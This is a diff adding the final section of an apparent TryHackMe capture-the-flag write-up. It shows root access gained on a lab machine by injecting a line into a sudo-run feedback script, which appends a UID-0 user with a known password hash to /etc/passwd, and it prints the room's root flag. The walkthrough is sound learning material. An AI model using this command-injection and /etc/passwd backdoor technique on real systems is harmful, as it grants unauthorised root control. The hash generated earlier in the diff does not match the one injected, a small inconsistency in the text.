@@ -286,4 +286,51 @@ deku@myheroacademia:~$ ls -l /opt/NewComponent/feedback.sh
 
 ```
 
+```
+$ mkpasswd -m md5crypt -s
+Password: 123456
+$1$uLasJCQF$YvDRzC8NMZBr6TDprT7yM.
+```
 
+```
+$ cd /opt/NewComponent/
+
+$ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+'troot:$1$ITaSSW7T$zr47/s8ZvVuyVMTCn/Yb00:0:0:troot:/root:/bin/bash' >> /etc/passwd
+It is This:
+Feedback successfully saved.
+deku@myheroacademia:/opt/NewComponent$ su troot
+Password: 
+root@myheroacademia:/opt/NewComponent# cd
+root@myheroacademia:~# ls
+root.txt  snap
+root@myheroacademia:~# cat root.txt 
+root@myheroacademia:/opt/NewComponent# cat /root/root.txt
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                  _    _ 
+             _   _        ___    | |  | |
+            | \ | | ___  /   |   | |__| | ___ _ __  ___
+            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
+            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
+            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
+
+THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+
+root@myheroacademia:~# 
+```
+
+
+
+
+
+GOT HELP FROM:
+https://jaxafed.github.io/posts/tryhackme-ua_high_school/
